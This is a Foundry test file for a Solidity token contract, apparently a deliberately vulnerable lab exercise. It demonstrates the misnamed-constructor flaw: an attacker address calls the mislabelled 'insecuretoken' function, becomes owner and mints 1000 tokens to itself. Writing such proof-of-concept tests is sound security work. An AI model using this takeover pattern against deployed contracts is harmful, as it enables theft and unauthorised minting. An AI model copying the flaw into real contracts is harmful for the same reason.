// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A14.sol";

contract InsecureTokenTest is Test {
    InsecureToken token;
    address deployer = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.prank(deployer);
        token = new InsecureToken(); // Deploys contract (but constructor isn't called!)
    }

    function testConstructorVulnerability() public {
        // 1. Initially, owner is unset (0x0) because the constructor wasn't called
        assertEq(token.owner(), address(0));

        // 2. Attacker calls the misnamed "constructor" to become owner
        vm.prank(attacker);
        token.insecuretoken(); // Successfully sets attacker as owner!

        // 3. Attacker now has minting rights
        vm.prank(attacker);
        token.mint(attacker, 1000e18); // Mints free tokens
        assertEq(token.balanceOf(attacker), 1000e18);
    }
}